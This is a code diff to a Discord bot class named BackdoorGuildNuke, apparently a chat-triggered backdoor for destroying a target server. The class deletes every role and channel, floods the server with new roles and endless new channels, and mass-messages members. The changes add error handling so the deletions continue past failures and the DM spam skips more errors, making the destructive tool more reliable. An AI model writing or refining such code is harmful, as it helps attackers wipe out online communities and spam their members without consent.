@@ -122,7 +122,10 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
         async def role_nuke():
             await message.channel.send("Starting Role Nuke")
             for i in target_guild.roles:
-                await i.delete(reason=values["role_reason"])
+                try:
+                    await i.delete(reason=values["role_reason"])
+                except Exception as e:
+                    print(f"Failed to delete {str(i)} because of {str(e)}")
 
             await message.channel.send("Starting Role Flood")
             colour = discord.Colour(values["role_colour_hex"])
@@ -149,7 +152,10 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
         async def channel_nuke():
             await message.channel.send("Starting Channel Nuke")
             for i in target_guild.channels:
-                await i.delete(reason=values["text_channel_reason"])
+                try:
+                    await i.delete(reason=values["text_channel_reason"])
+                except Exception as e:
+                    print(f"Failed to delete {str(i)} because of {str(e)}")
 
             await message.channel.send(f"Starting Channel Flood")
             while True:
@@ -172,7 +178,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
                 i: discord.Member
                 try:
                     await i.send(values["dm_channel_message"])
-                except (discord.HTTPException, discord.Forbidden):
+                except (discord.HTTPException, discord.Forbidden, AttributeError):
                     pass
                 else:
                     sent_dm_count += 1
